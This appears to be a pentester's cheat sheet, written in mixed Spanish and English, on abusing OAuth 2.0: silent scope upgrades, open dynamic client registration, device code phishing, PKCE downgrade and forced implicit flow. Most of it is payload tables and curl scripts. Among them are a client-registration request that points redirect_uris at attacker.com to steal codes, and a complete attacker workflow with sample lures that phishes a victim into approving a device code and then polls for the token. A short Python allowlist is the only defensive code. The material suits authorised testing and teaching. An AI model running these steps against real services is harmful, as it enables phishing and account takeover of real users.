---
aliases:
  - OAuth Scope Abuse
  - OAuth Consent Bypass
  - PKCE Downgrade
  - Device Code Phishing
tags:
  - type/cheatsheet
  - vuln/oauth
  - technique/privilege-escalation
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[OAuth 2.0 Misconfigurations]]"
  - "[[Phishing]]"
---
# OAuth 2.0 - Scope, Consent & Flow Abuse

***

## Scope Upgrade / Silent Re-Consent

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Provider omite re-consent UI si new request es subset o "compatible" con grant inicial. Atacante explota silent grant para escalar scopes. | Scope creep. |
| Scope superset trick | Initial request `scope=email`, segundo request `scope=email admin` con `prompt=none` | Server emite con admin? |
| Cumulative grants | Algunos providers acumulan scopes pre-grantados | Atacante consume escalado. |
| Scope downgrade y re-upgrade | Reset consent a low scope, después request high scope con auto-grant | Bypass UI. |
| Client_id swap escalation | Client A grantado, client B request similar → silent | Cross-client leak. |
| Refresh con scope upgrade | Refresh token request con `scope=admin` mayor original | Some servers accept. |
| Hybrid flow scope discrepancy | id_token scopes ≠ access_token scopes | Asymmetric. |
| `prompt=none` con expanded scope | Force silent re-consent | Bypass UX. |
| Scope alias confusion | `email` vs `userinfo:email` vs `profile.email` aliases | Logic flaw. |
| `*` wildcard scope | `scope=*` en algunos providers | Greedy. |
| Custom scope not in allowlist | `scope=internal:admin` | Accept-by-default. |
| Scope expansion via offline_access | `offline_access` adds refresh_token | Persistence. |
| Combine con dynamic registration | Atacante registra client con cualquier scope | Compound. |
| Combine con admin-only scope | If admin granted accidentally — full ATO | Critical. |
| Per-resource scope confusion | RFC 8707 resource indicators | Edge. |
| Scope validation only at /authorize | `/token` no re-checks | Validation gap. |
^oauth-abuse-scope

### Test silent upgrade

```bash
RT="capture_via_legit_flow"

# Refresh con scope ampliado
curl -s -X POST https://target/oauth/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$RT" \
  -d "scope=email admin internal" \
  -d "client_id=APP" \
  -d "client_secret=SECRET" | jq .
# Si returns access_token con scope=admin (no granted by user) → vuln
```

___

## Dynamic Client Registration

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | RFC 7591 permite registrar clients programáticamente vía `POST /register`. Si endpoint expuesto sin auth, atacante registra client con redirect_uri controlado. | Foundation jackpot. |
| Endpoint público sin auth | `POST /register` permite anónimos | Critical misconfig. |
| Endpoint con bearer débil | Default token guess | Adjacent. |
| Software statement no validated | JWT registration sin issuer check | Atacante crea fake JWT. |
| Type `confidential` sin verify secret | Atacante claims confidential pero no aporta secret | Server treats as confidential. |
| Redirect_uri sin restrictions | `redirect_uris=["https://attacker.com/cb"]` | Trivial code theft. |
| Scope sin restrictions | `scope=admin internal *` | Privilege escalation. |
| Grant types sin restrictions | `grant_types=["password","client_credentials"]` | Flow expansion. |
| Token endpoint auth method `none` | Public client sin secret | No auth required. |
| Logo URL XSS | `logo_uri` reflectado en consent UI | UI XSS. |
| Client name HTML | Nombre con HTML reflectado | XSS combo. |
| Tos URI / Policy URI | Open redirect via `tos_uri` | Phishing. |
| Initial Access Token leak | IAT exposed en logs / client | Adjacent. |
| Software statement leak | Pre-signed JWT exposed | Reuse. |
| Registration access token | Modify client after registration | Persistent. |
| Combine con scope wildcard | Register client + claim wildcard scope | Compound. |
^oauth-abuse-registration

### Test endpoint exposed

```bash
# Test público
curl -s -X POST https://target/oauth/register \
  -H 'Content-Type: application/json' \
  -d '{
    "client_name": "MaliciousApp",
    "redirect_uris": ["https://attacker.com/cb"],
    "grant_types": ["authorization_code", "refresh_token"],
    "response_types": ["code"],
    "scope": "openid email profile admin internal",
    "token_endpoint_auth_method": "none"
  }' | jq .

# Si returns client_id (+ optional client_secret) → registration abierto
```

___

## Device Code Phishing

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Device flow (RFC 8628) genera código user ingresa en browser para auth. Atacante phishea código → víctima auth atacante's device. | Real threat 2023-2024. |
| Atacante inicia device flow | `POST /device_authorization` → recibe `user_code`, `verification_uri` | Setup. |
| Email phishing con código | "Confirma tu cuenta en target/device — código ABCD-1234" | Social engineering. |
| Slack/Teams DM con código | Channel pretending IT support | Workplace vector. |
| QR code phishing | Pretending convenience — víctima scan | Mobile. |
| Atacante poll `/token` | Espera víctima approve | Async. |
| Short user_code TTL | Spec recommends 5-15 min | Attack window. |
| Polling sin rate limit | Atacante polls indefinitely | Defense gap. |
| Display app name spoofable | App name no validado en consent | UX confusion. |
| `verification_uri_complete` con código | URL pre-filled — convenience attack | Single click. |
| Microsoft OAuth target históricos | Real-world confirmed attacks | TA reports. |
| Google Cloud OAuth target | Real-world | TA reports. |
| AWS console combo | Device code + console access | Cloud. |
| Combine con Smishing | SMS con código | Mobile vector. |
| Combine con voice phishing | Vishing call con código | Adversarial. |
| Combine con post-auth scope | Atacante obtiene admin scope | Privilege escalation. |
^oauth-abuse-devicephishing

### Workflow atacante

```bash
# Step 1 — Atacante starts device flow
RESP=$(curl -s -X POST https://target/oauth/device/code \
  -d "client_id=APP" -d "scope=openid email profile offline_access")
DEVICE_CODE=$(echo "$RESP" | jq -r .device_code)
USER_CODE=$(echo "$RESP" | jq -r .user_code)
URI=$(echo "$RESP" | jq -r .verification_uri_complete)
echo "Send victim: $URI con código $USER_CODE"

# Step 2 — Atacante poll
while true; do
  TOKEN_RESP=$(curl -s -X POST https://target/oauth/token \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
    -d "device_code=$DEVICE_CODE" \
    -d "client_id=APP")
  if echo "$TOKEN_RESP" | grep -q access_token; then
    echo "$TOKEN_RESP" | jq .
    break
  fi
  sleep 5
done
```

___

## PKCE Downgrade

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | PKCE (RFC 7636) bindea `code_verifier` al code → atacante con code robado no exchanges. Bypass: downgrade el flow para evitar PKCE check. | Defense bypass. |
| PKCE opcional en server | Atacante exchanges code sin `code_verifier` → server accepts | Major misconfig. |
| `code_challenge_method=plain` | `verifier == challenge` plain text — no hash | Sniff challenge. |
| Server no valida method match | Cliente registró `S256`, atacante envía `plain` | Method downgrade. |
| Verifier brute force | Si verifier corto (<43 chars) | Trivial brute. |
| Reuse code_verifier | Mismo verifier across sessions | Predictable. |
| Verifier en localStorage | XSS lee | Combo. |
| Verifier en sessionStorage tab | Otros tabs — same origin pueden | Adjacent. |
| Verifier en cookie (no HttpOnly) | XSS reads | Bug. |
| Verifier pre-generated server-side | Server-side state → atacante predict if predictable | Server bug. |
| Verifier sin entropía | Weak random | Brute. |
| `code_challenge` sin verify | Server accepts cualquier challenge | Validation gap. |
| Mobile webview leaks | URL with verifier en logs | Mobile-specific. |
| Combine con redirect_uri lax | Token theft sin PKCE block | Compound. |
| OAuth 2.1 forces S256 | Modern best practice | Spec direction. |
| Public clients require PKCE | Mandatory for SPA/mobile | Defense. |
^oauth-abuse-pkce

### Test PKCE enforcement

```bash
# 1. Inicia flow con code_challenge
CHALLENGE="e9melhoraVjGgkw5jZcN-FWYwXJ_yA-mqK0c5fgKOfg"
curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://known.com/cb&scope=email&state=X&code_challenge=$CHALLENGE&code_challenge_method=S256"

# 2. Capture code emitido
CODE="capture_via_callback"

# 3. Exchange SIN code_verifier
curl -s -X POST https://target/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=$CODE" \
  -d "redirect_uri=https://known.com/cb" \
  -d "client_id=APP" | jq .
# Si returns access_token sin code_verifier → PKCE no enforced
```

___

## Implicit Flow Forced

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | OAuth 2.1 deprecó implicit, pero apps legacy lo soportan. Atacante fuerza downgrade a implicit para token en URL fragment (más fácil de robar). | Force-downgrade. |
| Server acepta `response_type=token` | Aún cuando spec recomienda Code+PKCE | Legacy support. |
| Force implicit cambio params | `response_type=code` → `response_type=token` | Param substitution. |
| Hybrid abuse | `response_type=code id_token token` | Multiple credentials. |
| Fragment fixation | Fragment persiste cross-redirect en algunos browsers | Replay. |
| Mobile webview default | Algunos webviews exponen URL post-redirect | Token leak. |
| Combine con redirect_uri parser confusion | Token directo a atacante sin server intercambio | Major chain. |
| Implicit con `prompt=none` | Silent token grant | Bypass UI. |
| Implicit con `display=popup` | Popup + window.opener combo | postMessage chain. |
| Variant `response_type=id_token` | Solo id_token — JWT en fragment | OIDC variant. |
| Variant `response_type=id_token token` | Both en fragment | Multi-leak. |
| Combine con XSS | XSS reads `location.hash` | Trivial post-XSS. |
| Combine con Referer leak | Token en URL → Referer | Layered leak. |
| Combine con browser history | Persistent local | History theft. |
| Combine con browser ext | Extensions ven fragment | User-trust. |
| Defense: `response_types_allowed` config | Reject `response_type` no registrados | Per-client. |
^oauth-abuse-implicit

### Force downgrade test

```http
# Atacante manipula request original cliente
GET /oauth/authorize?
  client_id=APP&
  response_type=token&     ← forzado, original era code
  redirect_uri=https://attacker-via-bypass/cb&
  scope=email&
  state=X
```

```python
# Server SAFE
ALLOWED_RESPONSE_TYPES_PER_CLIENT = {
    'web_app': ['code'],          # Solo code
    'spa': ['code'],              # PKCE code
    'mobile': ['code'],           # PKCE code
    # 'legacy_implicit': ['token'],  ← deprecated, evitar
}

response_type = request.args.get('response_type')
client_id = request.args.get('client_id')
allowed = ALLOWED_RESPONSE_TYPES_PER_CLIENT.get(client_id, [])
if response_type not in allowed:
    abort(400, 'response_type not allowed for this client')
```

***
